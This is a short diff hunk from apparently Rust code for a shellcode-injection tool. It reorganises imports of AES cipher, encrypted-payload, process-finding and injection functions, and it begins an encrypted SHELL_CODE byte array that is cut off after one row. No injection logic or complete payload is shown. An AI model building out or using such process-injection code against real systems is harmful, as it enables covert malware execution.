@@ -1,7 +1,5 @@
-use needle::{
-    cypher::{AesCypher, AesCypherExt, PayloadCypher},
-    find_process, inject, Shellcode,
-};
+use cyphres::aes::{AesCypher, AesCypherExt};
+use needle::{cypher::EncryptedPayload, find_process, inject, Shellcode};
 
 const SHELL_CODE: &[u8] = &[
     0x77, 0xe7, 0xb8, 0x57, 0xbb, 0x7f, 0x70, 0x3d, 0xcb, 0xa0, 0xc8, 0xbe, 0x56, 0xad, 0x58, 0xe0,
